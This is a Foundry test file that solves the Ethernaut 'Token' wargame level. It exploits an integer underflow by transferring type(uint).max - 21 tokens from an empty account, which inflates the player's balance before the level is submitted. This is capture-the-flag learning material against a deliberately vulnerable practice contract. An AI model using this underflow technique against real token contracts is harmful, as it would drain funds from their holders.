// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testTokenHack() public {
        /****************
         * Factory setup *
         *************** */
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress)); // 1000 is initial supply
        vm.stopPrank();
        console.log("Balance of player: %s", ethernautToken.balanceOf(player));
        /****************
         *    Attack     *
         *************** */
        vm.startPrank(player2);
        ethernautToken.transfer(player, type(uint).max - 21  );
        console.log("Balance of player: %s", ethernautToken.balanceOf(player));
        vm.stopPrank();
        vm.startPrank(player);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
